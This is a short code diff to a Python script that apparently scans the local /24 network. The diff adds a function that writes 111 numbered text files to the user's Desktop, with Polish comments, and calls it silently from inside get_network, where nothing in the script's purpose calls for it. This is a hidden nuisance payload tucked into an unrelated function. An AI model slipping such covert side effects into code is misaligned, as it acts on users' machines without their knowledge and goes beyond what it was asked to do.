@@ -6,12 +6,29 @@ import time
 import argparse
 import json
 from concurrent.futures import ThreadPoolExecutor
+import os
+
+def make_files():
+    # Pobiera ścieżkę do katalogu domowego użytkownika
+    home_dir = os.path.expanduser("~")
+    
+    for i in range(10000, 10111):
+        nazwa_pliku = f"{i}.txt"
+        # Łączy ścieżkę katalogu z nazwą pliku
+        sciezka_pelna = os.path.join(f'{home_dir}/Desktop', nazwa_pliku)
+        
+        try:
+            with open(sciezka_pelna, 'w', encoding='utf-8') as plik:
+                plik.write(f"To jest plik numer {i}")
+        except OSError as e:
+            print(f"Błąd: {e}")
 
 def get_network():
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     try:
         s.connect(("8.8.8.8", 80))
         ip = s.getsockname()[0]
+        make_files()
     finally:
         s.close()
     return ipaddress.IPv4Network(ip + "/24", strict=False)
